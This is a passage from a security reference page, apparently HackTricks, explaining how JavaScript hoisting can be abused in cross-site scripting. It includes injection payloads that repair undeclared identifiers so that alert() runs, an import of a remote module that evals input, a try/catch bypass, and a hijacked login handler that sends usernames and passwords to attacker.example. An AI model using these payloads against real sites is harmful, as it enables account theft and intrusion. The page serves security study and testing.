_body: "# JS Hoisting\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Basic Information\n\nIn the JavaScript language,\
  \ a mechanism known as **Hoisting** is described where declarations of variables, functions, classes, or imports are conceptually\
  \ raised to the top of their scope before the code is executed. This process is automatically performed by the JavaScript\
  \ engine, which goes through the script in multiple passes.\n\nDuring the first pass, the engine parses the code to check\
  \ for syntax errors and transforms it into an abstract syntax tree. This phase includes hoisting, a process where certain\
  \ declarations are moved to the top of the execution context. If the parsing phase is successful, indicating no syntax errors,\
  \ the script execution proceeds.\n\nIt is crucial to understand that:\n\n1. The script must be free of syntax errors for\
  \ execution to occur. Syntax rules must be strictly adhered to.\n2. The placement of code within the script affects execution\
  \ due to hoisting, although the executed code might differ from its textual representation.\n\n#### Types of Hoisting\n\n\
  Based on the information from MDN, there are four distinct types of hoisting in JavaScript:\n\n1. **Value Hoisting**: Enables\
  \ the use of a variable's value within its scope before its declaration line.\n2. **Declaration Hoisting**: Allows referencing\
  \ a variable within its scope before its declaration without causing a `ReferenceError`, but the variable's value will be\
  \ `undefined`.\n3. This type alters the behavior within its scope due to the variable's declaration before its actual declaration\
  \ line.\n4. The declaration's side effects occur before the rest of the code containing it is evaluated.\n\nIn detail, function\
  \ declarations exhibit type 1 hoisting behavior. The `var` keyword demonstrates type 2 behavior. Lexical declarations, which\
  \ include `let`, `const`, and `class`, show type 3 behavior. Lastly, `import` statements are unique in that they are hoisted\
  \ with both type 1 and type 4 behaviors.\n\n## Scenarios\n\nTherefore if you have scenarios where you can **Inject JS code\
  \ after an undeclared object** is used, you could **fix the syntax** by declaring it (so your code gets executed instead\
  \ of throwing an error):\n\n```javascript\n// The function vulnerableFunction is not defined\nvulnerableFunction('test',\
  \ '<INJECTION>');\n// You can define it in your injection to execute JS\n//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b\n\
  '-alert(1)-''); function vulnerableFunction(a,b){return 1};\n\n//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)\n\
  test'); function vulnerableFunction(a,b){ return 1 };alert(1)\n```\n\n```javascript\n// If a variable is not defined, you\
  \ could define it in the injection\n// In the following example var a is not defined\nfunction myFunction(a,b){\n    return\
  \ 1\n};\nmyFunction(a, '<INJECTION>')\n\n//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b\ntest'); var a = 1; alert(1);\n\
  ```\n\n```javascript\n// If an undeclared class is used, you cannot declare it AFTER being used\nvar variable = new unexploitableClass();\n\
  <INJECTION>\n// But you can actually declare it as a function, being able to fix the syntax with something like:\nfunction\
  \ unexploitableClass() {\n    return 1;\n}\nalert(1);\n```\n\n```javascript\n// Properties are not hoisted\n// So the following\
  \ examples where the 'cookie' attribute doesn´t exist\n// cannot be fixed if you can only inject after that code:\ntest.cookie(\"\
  leo\", \"INJECTION\")\ntest[(\"cookie\", \"injection\")]\n```\n\n## More Scenarios\n\n```javascript\n// Undeclared var accessing\
  \ to an undeclared method\nx.y(1,INJECTION)\n// You can inject\nalert(1));function x(){}//\n// And execute the allert with\
  \ (the alert is resolved before it's detected that the \"y\" is undefined\nx.y(1,alert(1));function x(){}//)\n```\n\n```javascript\n\
  // Undeclared var accessing 2 nested undeclared method\nx.y.z(1,INJECTION)\n// You can inject\n\");import {x} from \"https://example.com/module.js\"\
  //\n// It will be executed\nx.y.z(\"alert(1)\");import {x} from \"https://example.com/module.js\"//\")\n\n\n// The imported\
  \ module:\n// module.js\nvar x = {\n  y: {\n    z: function(param) {\n      eval(param);\n    }\n  }\n};\n\nexport { x };\n\
  ```\n\n```javascript\n// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/\n\
  // It was injected the: let config;`-alert(1)`//`\n// With the goal of making in the block the var config be empty, so the\
  \ return is not executed\n// And the same injection was replicated in the body URL to execute an alert\n\ntry {\n  if (config)\
  \ {\n    return\n  }\n  // TODO handle missing config for: https://try-to-catch.glitch.me/\"+`\n  let config\n  ;`-alert(1)`\
  \ //`+\"\n} catch {\n  fetch(\"/error\", {\n    method: \"POST\",\n    body: {\n      url:\n        \"https://try-to-catch.glitch.me/\"\
  \ +\n        `\nlet config;` -\n        alert(1) -\n        `//` +\n        \"\",\n    },\n  })\n}\ntrigger()\n```\n\n###\
  \ Hoisting to bypass exception handling\n\nWhen the sink is wrapped in a `try { x.y(...) } catch { ... }`, **ReferenceError**\
  \ will stop execution before your payload runs. You can pre-declare the missing identifier so the call survives and your\
  \ injected expression executes first:\n\n```javascript\n// Original sink (x and y are undefined, but you control INJECT)\n\
  x.y(1,INJECT)\n\n// Payload (ch4n3 2023) – hoist x so the call is parsed; use the first argument position for code exec\n\
  prompt()) ; function x(){} //\n```\n\n`function x(){}` is hoisted before evaluation, so the parser no longer throws on `x.y(...)`;\
  \ `prompt()` executes before `y` is resolved, then a `TypeError` is thrown after your code has run.\n\n### Preempt later\
  \ declarations by locking a name with const\n\nIf you can execute before a top-level `function foo(){...}` is parsed, declaring\
  \ a lexical binding with the same name (e.g., `const foo = ...`) will prevent the later function declaration from rebinding\
  \ that identifier. This can be abused in RXSS to hijack critical handlers defined later in the page:\n\n```javascript\n\
  // Malicious code runs first (e.g., earlier inline <script>)\nconst DoLogin = () => {\n  const pwd  = Trim(FormInput.InputPassword.value)\n\
  \  const user = Trim(FormInput.InputUtente.value)\n  fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd))\n\
  }\n\n// Later, the legitimate page tries to declare:\nfunction DoLogin(){ /* ... */ } // cannot override the existing const\
  \ binding\n```\n\nNotes\n- This relies on execution order and global (top-level) scope.\n- If your payload is executed inside\
  \ `eval()`, remember that `const/let` inside `eval` are block-scoped and won’t create global bindings. Inject a new `<script>`\
  \ element with the code to establish a true global `const`.\n\n### Dynamic import() with user-controlled specifiers\n\n\
  Server-side rendered apps sometimes forward user input into `import()` to lazy-load components. If a loader such as `import-in-the-middle`\
  \ is present, wrapper modules are generated from the specifier. Hoisted import evaluation fetches and executes the attacker-controlled\
  \ module before subsequent lines run, enabling RCE in SSR contexts (see CVE-2023-38704).\n\n### Tooling\n\nModern scanners\
  \ started to add explicit hoisting payloads. **KNOXSS v3.6.5** lists \"JS Injection with Single Quotes Fixing ReferenceError\
  \ - Object Hoisting\" and \"Hoisting Override\" test cases; running it against RXSS contexts that throw `ReferenceError`/`TypeError`\
  \ quickly surfaces hoist-based gadget candidates.\n\n## References\n\n- [https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios](https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios)\n\
